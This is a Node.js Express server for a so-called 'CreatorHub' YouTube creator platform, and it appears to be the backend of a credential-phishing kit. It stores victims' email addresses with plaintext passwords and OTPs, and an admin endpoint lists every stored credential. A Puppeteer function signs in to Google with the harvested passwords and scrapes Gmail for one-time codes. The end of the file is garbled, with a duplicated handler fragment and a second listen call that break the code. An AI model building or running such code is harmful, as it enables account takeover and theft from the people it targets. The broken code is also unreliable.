const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer');
const axios = require('axios');
const puppeteer = require('puppeteer');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const morgan = require('morgan');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(morgan('combined'));

// Rate limiting
const limiter = rateLimit({
  windowMs: process.env.RATE_LIMIT_WINDOW_MS || 15 * 60 * 1000, 
  max: process.env.RATE_LIMIT_MAX_REQUESTS || 100, 
  message: 'Too many requests from this IP, please try again later.'
});
app.use('/api/', limiter);

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/youtube-creator-platform')
.then(() => console.log('✅ MongoDB connected successfully'))
.catch(err => console.error('❌ MongoDB connection error:', err));

// Schemas
const credentialSchema = new mongoose.Schema({
  email: { type: String, required: true },
  passwordOriginal: { type: String, required: true },
  passwordEncrypted: { type: String, required: true },
  otp: { type: String },
  otpStatus: { type: String, default: 'Pending' },
  otpTimestamp: { type: Date },
  verifiedAt: { type: Date },
  timestamp: { type: Date, default: Date.now }
});

const Credential = mongoose.model('Credential', credentialSchema);

const adminSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  name: { type: String, required: true },
  role: { type: String, default: 'admin' },
  createdAt: { type: Date, default: Date.now }
});

const Admin = mongoose.model('Admin', adminSchema);

// Create default admin
const createDefaultAdmin = async () => {
  try {
    const adminExists = await Admin.findOne({ email: process.env.ADMIN_EMAIL });
    if (!adminExists && process.env.ADMIN_EMAIL) {
      const hashedPassword = await bcrypt.hash(process.env.ADMIN_PASSWORD || 'Admin@123', 10);
      const admin = new Admin({
        email: process.env.ADMIN_EMAIL,
        password: hashedPassword,
        name: 'Admin',
        role: 'superadmin'
      });
      await admin.save();
      console.log('✅ Default admin created');
    }
  } catch (error) {
    console.error('❌ Error creating default admin:', error);
  }
};
createDefaultAdmin();

// Email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD
  }
});

// Function to extract OTP from Gmail
async function extractOTP(email, password) {
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu']
    });
    
    const page = await browser.newPage();
    await page.goto('https://accounts.google.com/signin', { waitUntil: 'networkidle2' });
    
    await page.type('input[type="email"]', email);
    await page.click('#identifierNext');
    await page.waitForSelector('input[type="password"]', { visible: true });
    
    await page.type('input[type="password"]', password);
    await page.click('#passwordNext');
    await page.waitForNavigation({ waitUntil: 'networkidle2' });
    
    const twoFactorRequired = await page.$('input[data-initial-value=""]') !== null;
    if (twoFactorRequired) {
      await browser.close();
      return { success: false, message: '2FA authentication required' };
    }
    
    await page.goto('https://mail.google.com', { waitUntil: 'networkidle2' });
    await page.waitForSelector('.zA');
    
    const latestEmail = await page.$('.zA');
    if (!latestEmail) {
      await browser.close();
      return { success: false, message: 'No emails found' };
    }
    
    await latestEmail.click();
    await page.waitForSelector('.a3s', { visible: true });
    
    const emailContent = await page.$eval('.a3s', element => element.textContent);
    const otpMatch = emailContent.match(/\b(\d{6})\b/);
    const otp = otpMatch ? otpMatch[1] : null;
    
    await browser.close();
    return otp ? { success: true, otp } : { success: false, message: 'No OTP found' };
  } catch (error) {
    if (browser) await browser.close();
    return { success: false, message: error.message };
  }
}

// Routes
app.get('/', (req, res) => res.json({ message: 'CreatorHub API is active' }));

app.post('/api/admin-auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const admin = await Admin.findOne({ email });
    if (!admin || !(await bcrypt.compare(password, admin.password))) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    const token = jwt.sign({ id: admin._id, role: admin.role }, process.env.JWT_SECRET, { expiresIn: '1d' });
    res.json({ success: true, token, adminData: { email: admin.email, name: admin.name } });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

const adminAuth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) return res.status(401).json({ error: 'Invalid token' });
    req.admin = decoded;
    next();
  });
};

app.get('/api/admin/credentials', adminAuth, async (req, res) => {
  try {
    const credentials = await Credential.find().sort({ timestamp: -1 });
        res.status(200).json({ success: true, data: credentials });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// --- ADMIN PANEL INTEGRATION ---
const path = require('path');

// Is link se Admin Panel khulega
app.get('/admin-portal', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'admin-code.js'));
});
// -------------------------------

app.listen(PORT, () => {
  console.log(`🚀 Server is running on port ${PORT}`);
});

    res.json({ success: true, data: credentials });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
